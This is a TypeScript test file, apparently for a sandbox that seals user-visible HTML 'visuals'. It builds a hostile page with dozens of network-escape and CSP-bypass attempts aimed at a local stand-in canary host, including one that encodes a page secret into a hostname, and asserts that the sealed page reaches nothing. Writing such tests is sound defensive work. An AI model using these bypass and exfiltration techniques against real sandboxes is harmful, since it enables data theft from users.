// @effect-diagnostics nodeBuiltinImport:off
import * as NodeChildProcess from "node:child_process";
import * as NodeDgram from "node:dgram";
import * as NodeFS from "node:fs";
import * as NodeHttp from "node:http";
import * as NodeNet from "node:net";
import * as NodeOS from "node:os";
import * as NodePath from "node:path";

import { assert, it } from "@effect/vitest";
import * as HostProcess from "@t3tools/shared/HostProcess";
import {
  KIN_VISUAL_FILE_ROUTE,
  KIN_VISUAL_LIBRARIES,
  KIN_VISUAL_LIBRARY_ROUTE,
  KIN_VISUAL_OUTER_DOCUMENT,
  KIN_VISUAL_PRELUDE,
  kinVisualContentSecurityPolicy,
  kinVisualPageDocument,
} from "@t3tools/shared/kinVisual";
import * as Deferred from "effect/Deferred";
import * as Effect from "effect/Effect";
import { chromium, type Browser } from "playwright-core";

import { ASSET_ROUTE_PREFIX } from "../assets/AssetAccess.ts";
import { ignoresBrowserCookie } from "../auth/EnvironmentAuth.ts";
import { DESKTOP_RENDERER_ORIGINS } from "../httpCors.ts";

const TEST_BROWSER_ENV = "T3CODE_TEST_HEADLESS_SHELL";
// What T3 sends with a coding thread's page, which leaves the network open: the control.
const OPEN_POLICY = "sandbox allow-scripts allow-forms allow-popups allow-downloads";
// Every outside name the page uses in Chromium ends here; the browser maps them all to the TCP canary.
const OUTSIDE = "leak.canary";
/** Where a page's own reports go: the one Kin path its policy lets it load from. */
const REPORT = `${KIN_VISUAL_FILE_ROUTE}/report`;
const LIBRARY = (library: (typeof KIN_VISUAL_LIBRARIES)[number]) =>
  `${KIN_VISUAL_LIBRARY_ROUTE}/${library.version}/${library.name}.js`;

/**
 * Every way out a page has. `stun` is a UDP canary, `http` the TCP one under an outside name and
 * `port` its port, for names under `.localhost`. Each attempt that could open a second realm runs
 * the same STUN call there. The late stage runs after load, when `document.open` makes a parser.
 */
const hostilePage = (stun: string, http: string, port: number) => {
  const rtc = `try{var pc=new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]});(window.held=window.held||[]).push(pc);pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}`;
  const child = `<script>${rtc}<\\/script>`;
  const childAttr = child
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  const ws = http.replace(/^http/, "ws");
  return `<!doctype html><html><head>
<meta http-equiv="refresh" content="3;url=${http}/meta-refresh">
<link rel="preconnect" href="${http}"><link rel="dns-prefetch" href="${http}">
<link rel="stylesheet" href="${http}/stylesheet">
<link rel="prefetch" href="${http}/prefetch">
<link rel="preload" as="image" href="${http}/preload">
<link rel="modulepreload" href="${http}/modulepreload">
<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${http}/speculation"]}],"prerender":[{"source":"list","urls":["${http}/prerender"]}]}</script>
<script src="${http}/script"></script>
<style>@import url("${http}/css-import");@font-face{font-family:x;src:url("${http}/font")}body{font-family:x;background:url("${http}/css-image")}</style>
</head><body>
<p id="secret">Q3 revenue 4,812,000</p>
<img src="${http}/img"><video src="${http}/video"></video><audio src="${http}/audio"></audio>
<iframe src="${http}/iframe"></iframe><iframe srcdoc="${childAttr}"></iframe>
<object data="${http}/object"></object><embed src="${http}/embed">
<a id="link" href="${http}/link-click" ping="${http}/ping">x</a>
<form id="form" action="${http}/form" method="post"><input name="a" value="b"></form>
<script>
var child = ${JSON.stringify(child)};
var X = "http://www.w3.org/1999/xhtml";
// Built at run time: the page's own script text is scrubbed too, so literal tags would not test the sinks.
var L = "<" + "link", LU = "<" + "LINK", IF = "<" + "iframe", M = "<" + "meta";
var secret = document.getElementById("secret").textContent.replace(/[^a-z0-9]+/gi, "-").toLowerCase();
var shadows = [];
// Any of these connected for a moment is enough: WebKit preconnects a <link> as it is inserted.
function connectedNow() {
  var all = "link,iframe,frame,object,embed,portal,fencedframe,meta[http-equiv]", n = document.querySelectorAll(all).length;
  shadows.forEach(function (root) { n += root.querySelectorAll(all).length; });
  return n;
}
function foreign(markup) { var d = document.implementation.createHTMLDocument(""); d.open(); d.write("<li"); d.write(markup); d.close(); return d; }
function report(path, list) { new Image().src = new URL("${REPORT}/" + path + "?connected=" + list.join(","), location.href).href; }
// Blind every built-in a guard written in page script might lean on, before trying anything.
RegExp.prototype.exec = function () { return null; };
RegExp.prototype.test = function () { return false; };
String.prototype.toLowerCase = function () { return "x"; };
String.prototype.indexOf = function () { return -1; };
["localName", "tagName", "nodeName", "namespaceURI"].forEach(function (name) {
  Object.defineProperty(Element.prototype, name, { configurable: true, get: function () { return "div"; } });
});
Object.defineProperty(MutationRecord.prototype, "addedNodes", { configurable: true, get: function () { return []; } });
Event.prototype.preventDefault = function () {};
Node.prototype.removeChild = function (node) { return node; };
Element.prototype.remove = function () {};
Reflect.apply = function () {};
Function.prototype.call = function () {};
Function.prototype.apply = function () {};
var attempts = [
  function () { ${rtc} },
  function () { new webkitRTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = Function("return RTCPeerConnection")(); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = (0, eval)("window.RTCPeerConnection"); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { delete window.RTCPeerConnection; new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { navigator.mediaDevices.getUserMedia({ audio: true }); },
  function () { var f = document.createElement("iframe"); f.srcdoc = child; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute("srcdoc", child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute({ toString: function () { return "srcdoc"; } }, child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); var a = document.createAttribute("srcdoc"); a.value = child; f.setAttributeNode(a); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); f.setAttribute("srcdoc", child); },
  function () { var f = document.createElement("iframe"); f.src = "javascript:'" + child.replace(/'/g, "\\\\'") + "'"; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent(child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob([child], { type: "text/html" })); document.body.appendChild(f); },
  function () { var d = document.createElement("div"); d.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(d); },
  function () { document.body.insertAdjacentHTML("beforeend", IF + ' srcdoc="${childAttr}"></iframe>'); },
  function () { var t = document.createElement("template"); t.innerHTML = IF + ' srcdoc="${childAttr}"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); },
  function () { var x = new DOMParser().parseFromString('<html xmlns="http://www.w3.org/1999/xhtml"><body>' + IF + ' srcdoc="${childAttr}"/></body></html>', "application/xhtml+xml"); document.body.appendChild(document.adoptNode(x.getElementsByTagName("iframe")[0])); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); var C = f.contentWindow.RTCPeerConnection; new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var o = document.createElement("object"); o.data = "data:text/html," + encodeURIComponent(child); document.body.appendChild(o); },
  function () { new Worker(URL.createObjectURL(new Blob(["fetch('${http}/blob-worker')"], { type: "text/javascript" }))); },
  function () { new Worker("data:text/javascript,fetch('${http}/data-worker')"); },
  function () { new SharedWorker(URL.createObjectURL(new Blob(["fetch('${http}/shared-worker')"], { type: "text/javascript" }))); },
  function () { CSS.paintWorklet.addModule("data:text/javascript,0"); },
  function () { new AudioContext().audioWorklet.addModule(URL.createObjectURL(new Blob(["0"], { type: "text/javascript" }))); },
  function () { fetch("${http}/fetch", { mode: "no-cors" }).catch(function () {}); },
  function () { var x = new XMLHttpRequest(); x.open("GET", "${http}/xhr"); x.send(); },
  function () { new WebSocket("${ws}/websocket"); },
  function () { new WebTransport("https://${OUTSIDE}:4433/webtransport"); },
  function () { navigator.sendBeacon("${http}/beacon", "x"); },
  function () { new EventSource("${http}/event-source"); },
  function () { import("${http}/dynamic-import").catch(function () {}); },
  function () { window.open("${http}/window-open"); },
  function () { window.top.location = "${http}/top-navigation"; },
  function () { window.parent.location = "${http}/parent-navigation"; },
  function () { var s = document.createElement("script"); s.src = "${http}/script-dynamic"; document.head.appendChild(s); },
  function () { var l = document.createElement("link"); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { var l = document.createElement("LINK"); l.rel = "preconnect"; l.href = "${http}/upper"; document.head.appendChild(l); },
  function () { var l = document.createElement("link"); l.rel = "prefetch"; l.href = "${http}/prefetch-dynamic"; document.head.appendChild(l); },
  function () { var b = document.createElement("base"); b.href = "${http}/"; document.head.appendChild(b); new Image().src = "base-relative"; },
  function () { var l = document.createElementNS(X, "h:link"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(l); },
  function () { var l = document.createElementNS(X, "LINK"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}/ns-upper"); document.head.appendChild(l); },
  function () { var d = document.createElement("div"); d.innerHTML = L + ' rel="pre&#99;onnect" href="${http}">'; document.body.appendChild(d); },
  function () { document.body.insertAdjacentHTML("beforeend", LU + ' rel=preconnect href="${http}">'); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.outerHTML = L + ' rel="preconnect" href="${http}">'; },
  function () { var f = document.createDocumentFragment(), s = document.createElement("span"); f.appendChild(s); s.outerHTML = L + ' rel="preconnect" href="${http}/detached-outer">'; document.head.appendChild(f); },
  function () { var t = document.createElement("template"); t.innerHTML = '<template>' + L + ' rel="preconnect" href="${http}"></template>'; document.body.appendChild(t.content.firstChild.content.cloneNode(true)); },
  function () { var t = document.createElement("template"); t.innerHTML = L + ' rel="preconnect" href="${http}/template-adopt">'; document.head.appendChild(document.adoptNode(t.content)); },
  function () { var d = new DOMParser().parseFromString(L + ' rel="preconnect" href="${http}">', "text/html"); var l = d.querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = new DOMParser().parseFromString(M + ' http-equiv="refresh" content="0;url=${http}/parsed-meta">', "text/html"); var m = d.querySelector("meta"); if (m) document.head.appendChild(document.importNode(m, true)); },
  function () { var d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + X + '&#34; rel=&#34;preconnect&#34; href=&#34;${http}&#34;/&#62;">]><r>&e;</r>', "application/xml"); var l = d.getElementsByTagNameNS(X, "link")[0]; if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var x = new DOMParser().parseFromString('<frameset xmlns="' + X + '"><frame src="${http}/frameset"/></frameset>', "application/xhtml+xml"); document.body = document.importNode(x.documentElement, true); },
  function () { var l = document.implementation.createDocument(X, "link", null).documentElement; l.setAttribute("rel", "preconnect"); l.setAttribute("href", "${http}"); document.head.appendChild(document.adoptNode(l)); },
  function () { document.head.appendChild(document.createRange().createContextualFragment(L + ' rel="preconnect" href="${http}">')); },
  function () { var d = document.createElement("div"); d.setHTMLUnsafe(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); document.body.appendChild(d); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.setHTMLUnsafe('<div><template shadowrootmode="open">' + L + ' rel="preconnect" href="${http}/declarative-shadow"></template></div>'); var r = d.firstChild && d.firstChild.shadowRoot; if (r) shadows.push(r); },
  function () { var l = Document.parseHTMLUnsafe(L + ' rel="preconnect" href="${http}">').querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.streamHTMLUnsafe().getWriter().write(L + ' rel="preconnect" href="${http}/stream">'); },
  function () { document.write(L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'); },
  // The parser joins what separate calls write; each call alone holds no tag.
  function () { document.write("<li"); document.write('nk rel="preconnect" href="${http}/split-write">'); },
  function () { document.write("<"); document.write('link rel=preconnect href=${http}/split-angle>'); },
  function () { document.write("<li"); document.write('nk rel="preconnect" href="https://kin-secret-' + secret + '.localhost:${port}/">'); },
  function () { document.write("<ifr"); document.write('ame srcdoc="${childAttr}"></iframe>'); },
  function () { document.write("<me"); document.write('ta http-equiv="refresh" content="0;url=${http}/split-meta">'); },
  function () { document.write("<li", 'nk rel=preconnect href=${http}/write-args>'); },
  function () { document.writeln("<li"); document.writeln("nk rel=preconnect href=${http}/split-writeln>"); },
  function () { Document.prototype.write.call(document, "<li"); HTMLDocument.prototype.write.call(document, 'nk rel=preconnect href=${http}/split-prototype>'); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-open">'); var l = d.querySelector("link"); if (l) document.head.appendChild(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-import">'); document.head.appendChild(document.importNode(d.documentElement, true)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-range">'), l = d.querySelector("link"), r = document.createRange(); r.selectNodeContents(document.head); if (l) r.insertNode(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-adjacent">'), l = d.querySelector("link"); if (l) document.body.insertAdjacentElement("beforeend", document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-after">'), l = d.querySelector("link"); if (l) document.body.firstChild.after(document.adoptNode(l)); },
  function () { var d = foreign('nk rel="preconnect" href="${http}/foreign-replace">'), l = d.querySelector("link"), s = document.createElement("span"); document.body.appendChild(s); if (l) document.body.replaceChild(document.adoptNode(l), s); },
  function () { var m = document.createElement("meta"); document.head.appendChild(m); m.setAttribute("http-equiv", "refresh"); m.setAttribute("content", "0;url=${http}/meta-attribute"); },
  function () { var m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${http}/meta-property"; document.head.appendChild(m); },
  function () { var m = document.createElement("meta"), a = document.createAttribute("HTTP-EQUIV"); a.value = "refresh"; m.setAttributeNode(a); m.content = "0;url=${http}/meta-node"; document.head.appendChild(m); },
  function () { var m = document.createElement("meta"); m.toggleAttribute("http-equiv", true); document.head.appendChild(m); },
  function () { var m = document.createElement("meta"), a = document.createAttribute("http-equiv"); a.value = "refresh"; m.attributes.setNamedItem(a); document.head.appendChild(m); },
  function () { var d = document.createElement("div"); d.innerHTML = '<noscript><p title="</noscript>' + M + ' http-equiv=refresh content=0;url=${http}/noscript-meta>"></p></noscript>'; document.body.appendChild(d); },
  function () { var d = document.createElement("div"); d.innerHTML = '<svg><foreignObject>' + L + ' rel="preconnect" href="${http}/foreign-object"></foreignObject></svg><math><mi>' + L + ' rel=preconnect href=${http}/mathml></mi></math>'; document.body.appendChild(d); },
  function () { var t = document.createElement("textarea"); t.innerHTML = L + ' rel=preconnect href=${http}/textarea>'; var d = document.createElement("div"); d.innerHTML = t.value; document.body.appendChild(d); },
  function () { var t = document.createElement("title"); t.innerHTML = '</title>' + L + ' rel=preconnect href=${http}/title>'; document.head.appendChild(t); },
  function () { var d = document.createElement("div"); d.contentEditable = "true"; document.body.appendChild(d); d.focus(); document.execCommand("insertHTML", false, L + ' rel="preconnect" href="${http}">'); },
  function () { var d = document.createElement("div"); d.contentEditable = "true"; document.body.appendChild(d); d.focus(); document.execCommand("insertHTML", false, M + ' http-equiv="refresh" content="0;url=${http}/exec-meta">'); },
  function () { customElements.define("kin-l", class extends HTMLLinkElement {}, { extends: "link" }); var l = new (customElements.get("kin-l"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { var n = 0; customElements.define("kin-m", class extends HTMLLinkElement {}, { get extends() { return n++ ? "link" : "p"; } }); var l = new (customElements.get("kin-m"))(); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { new XSLTProcessor(); },
  function () { var d = document.createElement("div"); d.innerHTML = '<noscript><p title="</noscript>' + L + ' rel=preconnect href=${http}>"></p></noscript>'; document.body.appendChild(d); },
  function () { var h = document.createElement("div"); document.body.appendChild(h); var root = h.attachShadow({ mode: "open" }); shadows.push(root); root.innerHTML = L + ' rel="preconnect" href="${http}">' + IF + ' srcdoc="${childAttr}"></iframe>'; },
  function () { var h = document.createElement("div"); document.body.appendChild(h); var root = h.attachShadow({ mode: "open" }), d = foreign('nk rel="preconnect" href="${http}/foreign-shadow">'), l = d.querySelector("link"); shadows.push(root); if (l) root.appendChild(document.adoptNode(l)); },
  function () { var d = document.createElement("div"); document.body.appendChild(d); d.setHTML(L + ' rel="preconnect" href="${http}">'); },
];
var connected = connectedNow() ? ["start"] : [];
attempts.forEach(function (attempt, index) {
  try { attempt(); } catch (error) {}
  if (connectedNow()) connected.push(index);
});
// The page reached its last line and still loads from its own host.
report("attempted", connected);
// After load the parser is gone, and document.open would make the page a new one.
window.addEventListener("load", function () {
  setTimeout(function () {
    var late = [];
    try { document.open(); document.write("<li"); document.write('nk rel="preconnect" href="${http}/open-split">'); document.write("<ifr"); document.write('ame srcdoc="${childAttr}"></iframe>'); document.close(); } catch (error) {}
    if (connectedNow()) late.push("open");
    try { document.write("<li"); document.write('nk rel="preconnect" href="${http}/late-write">'); } catch (error) {}
    if (connectedNow()) late.push("write");
    report("late", late);
  });
});
// Navigating ends the page, so these go last, once STUN has had its chance in the control.
setTimeout(function () {
  try { document.getElementById("form").submit(); } catch (error) {}
  try { document.getElementById("link").click(); } catch (error) {}
  location.href = "${http}/self-navigation";
}, 2500);
</script></body></html>`;
};

interface Canaries {
  readonly stun: string;
  readonly tcpPort: number;
  /** What reached the canaries: `udp` packets and `tcp` connections. */
  readonly reached: Array<string>;
  readonly udp: Deferred.Deferred<void>;
  readonly tcp: Deferred.Deferred<void>;
}

const canaries = Effect.acquireRelease(
  Effect.callback<Canaries & { readonly close: () => void }>((resume) => {
    const reached: Array<string> = [];
    const seen = { udp: Deferred.makeUnsafe<void>(), tcp: Deferred.makeUnsafe<void>() };
    const hit = (kind: "udp" | "tcp") => {
      reached.push(kind);
      Deferred.doneUnsafe(seen[kind], Effect.void);
    };
    const udp = NodeDgram.createSocket("udp4");
    udp.on("message", () => hit("udp"));
    const tcp = NodeNet.createServer((socket) => {
      hit("tcp");
      socket.on("error", () => {});
      socket.destroy();
    });
    udp.bind(0, "127.0.0.1", () => {
      tcp.listen(0, "127.0.0.1", () => {
        resume(
          Effect.succeed({
            stun: `127.0.0.1:${udp.address().port}`,
            tcpPort: (tcp.address() as NodeNet.AddressInfo).port,
            reached,
            ...seen,
            close: () => {
              udp.close();
              tcp.close();
            },
          }),
        );
      });
    });
  }),
  ({ close }) => Effect.sync(close),
);

/** Serves the visual as the asset route does: the page only to a frame's own request. */
const visualHost = (
  page: string,
  sealed: boolean,
  reports: {
    readonly attempted: Deferred.Deferred<string>;
    readonly late: Deferred.Deferred<string>;
  },
) =>
  Effect.acquireRelease(
    Effect.callback<{ readonly port: number; readonly server: NodeHttp.Server }>((resume) => {
      const server = NodeHttp.createServer((request, response) => {
        const url = new URL(request.url ?? "/", "http://kin.test");
        if (url.pathname === `${REPORT}/attempted`)
          Deferred.doneUnsafe(
            reports.attempted,
            Effect.succeed(url.searchParams.get("connected") ?? ""),
          );
        if (url.pathname === `${REPORT}/late`)
          Deferred.doneUnsafe(
            reports.late,
            Effect.succeed(url.searchParams.get("connected") ?? ""),
          );
        if (url.pathname !== "/visual") {
          response.writeHead(200, { "content-type": "image/gif" }).end();
          return;
        }
        const inner =
          url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
        response
          .writeHead(200, {
            "content-type": "text/html; charset=utf-8",
            "content-security-policy": sealed
              ? kinVisualContentSecurityPolicy(inner ? "page" : "outer")
              : OPEN_POLICY,
          })
          .end(inner ? page : KIN_VISUAL_OUTER_DOCUMENT);
      });
      server.listen(0, "127.0.0.1", () => {
        resume(Effect.succeed({ port: (server.address() as NodeNet.AddressInfo).port, server }));
      });
    }),
    ({ server }) =>
      Effect.sync(() => {
        server.closeAllConnections();
        server.close();
      }),
  );

const launch = (executable: string, tcpPort: number, netLog?: string) =>
  Effect.acquireRelease(
    Effect.promise(() =>
      chromium.launch({
        executablePath: executable,
        headless: true,
        args: [
          `--host-resolver-rules=MAP *.canary 127.0.0.1:${tcpPort}`,
          ...(netLog === undefined
            ? []
            : [`--log-net-log=${netLog}`, "--net-log-capture-mode=Everything"]),
        ],
      }),
    ),
    (browser: Browser) => Effect.promise(() => browser.close()),
  );

const sendsFrom = (sealed: boolean, canary: Canaries, http: string) => {
  // The control is the raw page, as a coding thread serves it: no prelude, no Kin policy.
  const page = hostilePage(canary.stun, http, canary.tcpPort);
  return sealed ? kinVisualPageDocument(page) : page;
};

/** Opens the hostile visual in Chromium and resolves once its page has run every attempt. */
const openInChromium = Effect.fn("test.openInChromium")(function* (
  executable: string,
  sealed: boolean,
  directory: string,
) {
  const canary = yield* canaries;
  const reports = {
    attempted: yield* Deferred.make<string>(),
    late: yield* Deferred.make<string>(),
  };
  const host = yield* visualHost(sendsFrom(sealed, canary, `http://${OUTSIDE}`), sealed, reports);
  const netLog = NodePath.join(directory, `${sealed ? "sealed" : "open"}.json`);
  const browser = yield* launch(executable, canary.tcpPort, netLog);
  const tab = yield* Effect.promise(() => browser.newPage());
  yield* Effect.promise(() => tab.goto(`http://127.0.0.1:${host.port}/visual`));
  /** Attempts after which a `<link>`, frame or http-equiv meta was in the document, even for a moment. */
  const connected = yield* Deferred.await(reports.attempted);
  const late = yield* Deferred.await(reports.late);
  return { canary, browser, netLog, page: tab, connected, late };
});

it.live("a hostile page in a Kin visual reaches nothing off its own host", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const directory = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "kin-visual-seal-"));
    yield* Effect.addFinalizer(() =>
      Effect.sync(() => NodeFS.rmSync(directory, { recursive: true, force: true })),
    );

    // The sealed page runs first. Then the same page under T3's open policy: its exits reaching
    // the canaries mark the time by which the sealed page's would have arrived too.
    const sealed = yield* openInChromium(executable, true, directory);
    const open = yield* openInChromium(executable, false, directory);
    // STUN and a socket both reach the open canary, so silence below is not a blind canary.
    yield* Deferred.await(open.canary.udp);
    yield* Deferred.await(open.canary.tcp);

    // The sealed frame's top document is still the outer one: nothing navigated it away.
    const outer = yield* Effect.promise(() => sealed.page.content());
    assert.include(outer, "<iframe");
    assert.notInclude(outer, "hostile");
    yield* Effect.promise(() => sealed.browser.close());
    yield* Effect.promise(() => open.browser.close());

    assert.deepStrictEqual(sealed.canary.reached, []);
    assert.strictEqual(sealed.connected, "");
    assert.strictEqual(sealed.late, "");
    assert.notStrictEqual(open.connected, "");
    // The browser's own resolver log: the sealed page never even looked an outside name up.
    const sealedLog = NodeFS.readFileSync(sealed.netLog, "utf8");
    assert.notInclude(sealedLog, OUTSIDE);
    assert.notInclude(sealedLog, "kin-secret");
    assert.include(NodeFS.readFileSync(open.netLog, "utf8"), OUTSIDE);
  }).pipe(Effect.scoped),
);

/**
 * A WKWebView runner built from `visualSeal.webkit.swift`: Safari's engine, and the iPhone app's.
 * Only macOS with Xcode's `swiftc` can build it; CI cannot, so there the WebKit tests skip.
 */
const webkitRunner = (() => {
  let built: Promise<string | undefined> | undefined;
  return () =>
    Effect.flatMap(HostProcess.Platform, (platform) =>
      Effect.promise(() => {
        built ??= new Promise<string | undefined>((resolve) => {
          if (platform !== "darwin") return resolve(undefined);
          const directory = NodeFS.mkdtempSync(
            NodePath.join(NodeOS.tmpdir(), "kin-visual-webkit-"),
          );
          const binary = NodePath.join(directory, "runner");
          NodeChildProcess.execFile(
            "swiftc",
            ["-O", new URL("./visualSeal.webkit.swift", import.meta.url).pathname, "-o", binary],
            (error) => resolve(error ? undefined : binary),
          );
        });
        return built;
      }),
    );
})();
const WEBKIT_SKIP = "WebKit runs only on macOS with Xcode's swiftc; CI does not run this.";

/** One WKWebView on `url` until the scope closes; `injected` runs first in every inner frame. */
const openInWebKit = (runner: string, url: string, injected?: string) =>
  Effect.acquireRelease(
    Effect.sync(() =>
      NodeChildProcess.spawn(runner, injected === undefined ? [url] : [url, injected], {
        stdio: "ignore",
      }),
    ),
    (child) => Effect.sync(() => child.kill()),
  );

it.live("the same hostile page reaches nothing off its own host in WebKit", (ctx) =>
  Effect.gen(function* () {
    const runner = yield* webkitRunner();
    if (runner === undefined) return ctx.skip(WEBKIT_SKIP);
    const directory = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "kin-visual-webkit-page-"));
    yield* Effect.addFinalizer(() =>
      Effect.sync(() => NodeFS.rmSync(directory, { recursive: true, force: true })),
    );
    // As the iPhone app runs it: the prelude injected in the frame, and again in the page.
    const prelude = NodePath.join(directory, "prelude.js");
    NodeFS.writeFileSync(prelude, KIN_VISUAL_PRELUDE);
    const run = Effect.fn("test.runInWebKit")(function* (sealed: boolean, injected?: string) {
      const canary = yield* canaries;
      const reports = {
        attempted: yield* Deferred.make<string>(),
        late: yield* Deferred.make<string>(),
      };
      // Kin is `localhost`; the canary's 127.0.0.1 is another site its policy does not allow.
      const page = sendsFrom(sealed, canary, `http://127.0.0.1:${canary.tcpPort}`);
      const host = yield* visualHost(page, sealed, reports);
      yield* openInWebKit(runner, `http://localhost:${host.port}/visual`, injected);
      const connected = yield* Deferred.await(reports.attempted);
      const late = yield* Deferred.await(reports.late);
      return { canary, connected, late };
    });
    const sealed = yield* run(true);
    const injected = yield* run(true, prelude);
    const open = yield* run(false);
    yield* Deferred.await(open.canary.tcp);

    assert.deepStrictEqual(sealed.canary.reached, []);
    assert.deepStrictEqual(injected.canary.reached, []);
    for (const page of [sealed, injected]) {
      assert.strictEqual(page.connected, "");
      assert.strictEqual(page.late, "");
    }
    assert.notStrictEqual(open.connected, "");
  }).pipe(Effect.scoped),
);

const PIXEL = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

/** A page drawing with all three libraries, served the way the asset route and library route do. */
const librariesHost = Effect.gen(function* () {
  assert.strictEqual(ASSET_ROUTE_PREFIX, KIN_VISUAL_FILE_ROUTE);
  const files = Object.fromEntries(
    KIN_VISUAL_LIBRARIES.map((library) => {
      const entry = import.meta.resolve(library.name);
      const marker = `/node_modules/${library.name}/`;
      const root = new URL(entry).pathname;
      return [
        LIBRARY(library),
        NodeFS.readFileSync(root.slice(0, root.lastIndexOf(marker) + marker.length) + library.file),
      ];
    }),
  );
  const drawn = yield* Deferred.make<string>();
  const page = `<!doctype html><html><head>${KIN_VISUAL_LIBRARIES.map((library) => `<script src="${LIBRARY(library)}"></script>`).join("")}</head><body>
<script src="/elsewhere.js"></script>
<div id="c" style="height:200px"></div><pre class="mermaid">flowchart LR; A-->B</pre><svg id="s"></svg>
<img id="away" src="/elsewhere.gif">
<script>
document.write("<p id='written'>written <b>whole</b></p>");
kin.echarts("#c", { series: [{ type: "treemap", data: [{ name: "a", value: 3 }, { name: "b", value: 5 }] }] });
d3.select("#s").selectAll("circle").data([1, 2, 3]).join("circle").attr("r", 4);
kin.mermaid().then(function () {
  var away = document.getElementById("away");
  function done() {
    // Kin paths other than the libraries and files stay closed to the page.
    var report = [!!document.querySelector("#c canvas"), document.querySelectorAll("#s circle").length, !!document.querySelector(".mermaid svg"), !!document.querySelector("#written b"), window.elsewhere === true, away.naturalWidth > 0].join(",");
    new Image().src = "${REPORT}/drawn?" + report;
  }
  if (away.complete) done(); else away.onload = away.onerror = done;
});
</script></body></html>`;
  const server = NodeHttp.createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://kin.test");
    if (url.pathname === `${REPORT}/drawn`) Deferred.doneUnsafe(drawn, Effect.succeed(url.search));
    const file = files[url.pathname];
    if (file !== undefined || url.pathname === "/elsewhere.js") {
      response
        .writeHead(200, { "content-type": "text/javascript" })
        .end(file ?? "window.elsewhere = true;");
      return;
    }
    if (url.pathname === "/elsewhere.gif") {
      response.writeHead(200, { "content-type": "image/gif" }).end(PIXEL);
      return;
    }
    if (url.pathname !== "/visual") {
      response.writeHead(204).end();
      return;
    }
    const inner = url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
    response
      .writeHead(200, {
        "content-type": "text/html; charset=utf-8",
        "content-security-policy": kinVisualContentSecurityPolicy(inner ? "page" : "outer"),
      })
      .end(inner ? kinVisualPageDocument(page) : KIN_VISUAL_OUTER_DOCUMENT);
  });
  yield* Effect.acquireRelease(
    Effect.callback<void>((resume) => {
      server.listen(0, "127.0.0.1", () => resume(Effect.void));
    }),
    () =>
      Effect.sync(() => {
        server.close();
      }),
  );
  return { port: (server.address() as NodeNet.AddressInfo).port, drawn };
});

it.live("the three libraries still draw inside the seal", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const { port, drawn } = yield* librariesHost;
    const browser = yield* Effect.acquireRelease(
      Effect.promise(() => chromium.launch({ executablePath: executable, headless: true })),
      (opened) => Effect.promise(() => opened.close()),
    );
    const tab = yield* Effect.promise(() => browser.newPage());
    yield* Effect.promise(() => tab.goto(`http://127.0.0.1:${port}/visual`));
    assert.strictEqual(yield* Deferred.await(drawn), "?true,3,true,true,false,false");
  }).pipe(Effect.scoped),
);

it.live("the three libraries still draw inside the seal in WebKit", (ctx) =>
  Effect.gen(function* () {
    const runner = yield* webkitRunner();
    if (runner === undefined) return ctx.skip(WEBKIT_SKIP);
    const { port, drawn } = yield* librariesHost;
    yield* openInWebKit(runner, `http://localhost:${port}/visual`);
    assert.strictEqual(yield* Deferred.await(drawn), "?true,3,true,true,false,false");
  }).pipe(Effect.scoped),
);

/**
